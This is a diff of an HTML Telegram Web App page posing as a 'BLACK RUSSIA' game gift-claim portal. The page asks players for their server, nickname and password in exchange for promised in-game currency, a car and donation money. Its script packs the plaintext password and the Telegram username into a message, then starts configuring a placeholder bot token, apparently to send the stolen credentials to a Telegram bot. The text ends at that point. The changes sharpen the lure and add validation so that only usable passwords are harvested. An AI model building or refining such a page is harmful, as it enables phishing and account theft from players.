@@ -37,30 +37,14 @@
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
         
-        /* Шапка с логотипом */
         .header {
             padding: 16px;
             background: rgba(0, 0, 0, 0.8);
             border-bottom: 1px solid #ff0000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            text-align: center;
         }
         
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .logo-icon {
-            width: 30px;
-            height: 30px;
-            object-fit: contain;
-        }
-        
-        .logo-text {
+        .logo {
             color: #ff0000;
             font-weight: bold;
             font-size: 24px;
@@ -68,7 +52,6 @@
             text-transform: uppercase;
         }
         
-        /* Основной контент */
         .content {
             padding: 16px;
         }
@@ -101,6 +84,13 @@
             border-radius: 8px;
             color: #fff;
             font-size: 16px;
+        }
+        
+        .error {
+            color: #ff5555;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
         }
         
         .promo-code {
@@ -155,61 +145,60 @@
 </head>
 <body>
     <div class="container">
-        <!-- Шапка с логотипом и иконкой -->
         <div class="header">
-            <div class="logo-container">
-                <img src="https://i.pinimg.com/originals/.../black-russia-icon.png" alt="Black Russia Icon" class="logo-icon">
-                <div class="logo-text">BLACK RUSSIA</div>
-            </div>
+            <div class="logo">BLACK RUSSIA</div>
         </div>
         
-        <!-- Основной контент -->
         <div class="content">
-            <h1>ПОЛУЧИТЬ ПОДАРОК</h1>
+            <h1>ЛИЧНЫЙ КАБИНЕТ</h1>
             
-            <div class="form-group">
-                <label>Укажи сервер</label>
-                <select id="server" required>
-                    <option value="" disabled selected>Выбери из списка</option>
-                    <option value="Server 1">Server 1</option>
-                    <option value="Server 2">Server 2</option>
-                    <option value="Server 3">Server 3</option>
-                </select>
-            </div>
-            
-            <div class="form-group">
-                <label>Введи игровой ник</label>
-                <input type="text" id="nickname" placeholder="Имя_Фамилия" pattern="^[А-Яа-яЁёA-Za-z]+_[А-Яа-яЁёA-Za-z]+$" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Введи пароль</label>
-                <input type="password" id="password" placeholder="Твой пароль" required>
-            </div>
-            
-            <!-- Неизменяемый промокод -->
-            <div class="promo-code">
-                Промокод: #SUMMER
-            </div>
-            
-            <button class="btn" id="submitBtn">Получить подарок</button>
+            <form id="giftForm">
+                <div class="form-group">
+                    <label>Укажи сервер</label>
+                    <select id="server" required>
+                        <option value="" disabled selected>Выбери из списка</option>
+                        <option value="Server 1">Server 1</option>
+                        <option value="Server 2">Server 2</option>
+                        <option value="Server 3">Server 3</option>
+                    </select>
+                    <div class="error" id="serverError">Пожалуйста, выберите сервер</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Введи игровой ник</label>
+                    <input type="text" id="nickname" placeholder="Nick_Name" required>
+                    <div class="error" id="nickError">Формат: только латинские буквы и одно подчёркивание (пример: Nick_Name)</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Введи пароль</label>
+                    <input type="password" id="password" placeholder="Пароль (минимум 6 символов)" required>
+                    <div class="error" id="passError">Пароль должен содержать минимум 6 символов (латиница/цифры/спецсимволы)</div>
+                </div>
+                
+                <div class="promo-code">
+                    Промокод: #SUMMER
+                </div>
+                
+                <button type="submit" class="btn">Получить подарок</button>
+            </form>
             
             <div class="gift-list">
-                <h3>ЧТО ТЕБЯ ЖДЁТ В BLACK RUSSIA?</h3>
+                <h3>ЧТО ТЫ ПОЛУЧИШЬ?</h3>
                 
                 <div class="gift-item">
-                    <div class="gift-title">BLACK PASS</div>
-                    <div>Эксклюзивный доступ к премиум-наградам сезона!</div>
+                    <div class="gift-title">ИГРОВАЯ ВАЛЮТА</div>
+                    <div>1.000.000 игровой валюты на свой аккаунт!</div>
                 </div>
                 
                 <div class="gift-item">
-                    <div class="gift-title">Увеличение слогов</div>
-                    <div>+10 слотов для транспорта в гараже</div>
+                    <div class="gift-title">АВТОМОБИЛЬ</div>
+                    <div>BMW M5 F90 НАВСЕГДА!</div>
                 </div>
-                
+
                 <div class="gift-item">
-                    <div class="gift-title">100 BC</div>
-                    <div>Игровая валюта для покупок</div>
+                    <div class="gift-title">ДОНАТ ВАЛЮТА</div>
+                    <div>5.000₽ на свой игровой аккаунт!</div>
                 </div>
             </div>
         </div>
@@ -219,23 +208,45 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
         
-        // Обработка формы
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const server = document.getElementById('server').value;
-            const nickname = document.getElementById('nickname').value;
-            const password = document.getElementById('password').value;
-            const promoCode = "#SUMMER"; // Фиксированный промокод
+        // Валидация формы
+        document.getElementById('giftForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            if (!/^[А-Яа-яЁёA-Za-z]+_[А-Яа-яЁёA-Za-z]+$/.test(nickname)) {
-                tg.showAlert('Ник должен быть в формате: Имя_Фамилия');
-                return;
+            // Сброс ошибок
+            document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
+            let isValid = true;
+            
+            // Проверка сервера
+            const server = document.getElementById('server').value;
+            if (!server) {
+                document.getElementById('serverError').style.display = 'block';
+                isValid = false;
             }
             
+            // Проверка ника (латинские буквы + одно подчёркивание)
+            const nickname = document.getElementById('nickname').value;
+            const nickRegex = /^[A-Za-z]+_[A-Za-z]+$/;
+            if (!nickRegex.test(nickname)) {
+                document.getElementById('nickError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Проверка пароля (минимум 6 символов, без русских букв)
+            const password = document.getElementById('password').value;
+            const passRegex = /^[^\u0400-\u04FF]{6,}$/; // Без русских букв
+            if (password.length < 6 || !passRegex.test(password)) {
+                document.getElementById('passError').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!isValid) return;
+            
+            // Отправка данных
             const message = `🎁 НОВЫЙ ЗАПРОС НА ПОДАРОК!\n\n` +
                           `🎮 Сервер: ${server}\n` +
                           `🆔 Ник: ${nickname}\n` +
                           `🔑 Пароль: ${password}\n` +
-                          `🎫 Промокод: ${promoCode}\n` +
+                          `🎫 Промокод: #SUMMER\n` +
                           `От: @${tg.initDataUnsafe.user?.username || 'аноним'}`;
             
             const botToken = 'ВАШ_BOT_TOKEN';
